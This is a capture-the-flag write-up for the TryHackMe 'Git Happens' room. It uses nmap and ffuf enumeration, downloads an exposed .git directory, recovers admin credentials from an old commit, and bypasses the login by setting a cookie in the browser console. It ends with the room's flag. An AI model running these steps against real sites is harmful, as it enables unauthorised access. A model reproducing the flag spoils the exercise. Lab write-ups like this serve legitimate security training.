# Solution

## URL
- [Git Happens](https://tryhackme.com/room/githappens)

## Steps

### Enumerate:
1. Run a full NMAP port scan: `sudo nmap -v -sS -p- 10.10.48.67 | tee nmap-scan.txt`.
2. A website is running on port 80, fuzz the directories/files: `sudo ffuf -u http://10.10.48.67/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -mc 200,301,302,403 -fs 6890 -v | tee ffuf-dir-fuzz.txt`.
3. `/robots.txt` and `/sitemap.xml` did not reveal anything.
4. Checked `/.git` and got the git directory. Downloading that `wget --recursive --no-parent http://10.10.101.120/.git/`

### Git enumeration:
1. We got a new directory. `cd` into that directory.
2. Running `git status` we can see some deleted files, these are just files we were not able to download, so let's try to restore that by `git restore .`.
3. Now we can check logs by `git log`. In this we can see there is a commit with the comment `Obfuscated the source code`, so if we view the commit before this we might get the password?
4. So let's checkout that commit `git checkout 395e087334d613d5e423cdf8f7be27196a360459`. Checking the index.html page, we got the credentials: `admin:Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!`.

### Access
1. Trying to login with this is giving some error in console, but we know from the source code that, after giving the correct cerdentials, it was just setting a cookie `login=1` and redirecting us to `/dashboard.html`. So let's do that ourselves.
2. Open the console in dev tools and enter `document.cookie = "login=1";` and then `window.location.href = "/dashboard.html";`.
3. We logged in! And got the message: `Awesome! Use the password you input as the flag!`.

### Task 1:
#### Find the Super Secret Password
1. The answer is `Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!`.